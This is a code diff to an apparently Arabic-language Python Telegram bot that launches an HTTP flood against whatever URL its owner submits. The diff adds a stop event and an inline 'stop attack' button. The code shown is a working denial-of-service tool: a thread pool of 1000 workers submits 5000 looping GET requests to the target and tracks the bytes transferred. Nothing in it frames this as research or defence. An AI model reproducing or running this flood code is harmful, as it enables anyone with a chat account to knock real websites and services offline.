@@ -24,6 +24,9 @@ session.verify = False
 bytes_transferred = 0
 lock = threading.Lock()
 
+# متغير لإيقاف الهجوم
+stop_attack_event = threading.Event()
+
 # قائمة المالكين
 Owner = ['6358035274']
 
@@ -45,7 +48,7 @@ load_lists()
 
 def attack(url):
     global bytes_transferred
-    while True:
+    while not stop_attack_event.is_set():
         try:
             response = session.get(url, headers=headers)
             with lock:
@@ -55,6 +58,7 @@ def attack(url):
             print("حدث خطأ:", e)
 
 def start_attack(url):
+    stop_attack_event.clear()
     with ThreadPoolExecutor(max_workers=1000) as executor:
         for _ in range(5000):
             executor.submit(attack, url)
@@ -64,6 +68,10 @@ def start_attack(url):
         print(response.text)
     except Exception as e:
         print("حدث خطأ أثناء الطلب الأولي:", e)
+
+def stop_attack():
+    stop_attack_event.set()
+    print("تم إيقاف الهجوم.")
 
 def calculate_speed():
     global bytes_transferred
@@ -109,6 +117,9 @@ def callback_query(call):
         elif call.data == "start_attack":
             msg = bot.send_message(call.message.chat.id, "أدخل رابط الهدف لبدء الهجوم:")
             bot.register_next_step_handler(msg, process_start_attack)
+        elif call.data == "stop_attack":
+            stop_attack()
+            bot.send_message(call.message.chat.id, "تم إيقاف الهجوم.")
     else:
         bot.send_message(call.message.chat.id, "أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")
 
@@ -133,6 +144,11 @@ def process_start_attack(message):
         # بدء الهجوم في خيط منفصل
         attack_thread = threading.Thread(target=start_attack, args=(url,))
         attack_thread.start()
+
+        # إضافة زر إيقاف الهجوم
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("إيقاف الهجوم", callback_data="stop_attack"))
+        bot.send_message(message.chat.id, "الهجوم جاري. اضغط على الزر أدناه لإيقاف الهجوم:", reply_markup=markup)
     else:
         bot.reply_to(message, "لم يتم إدخال رابط الهدف بشكل صحيح.")
 
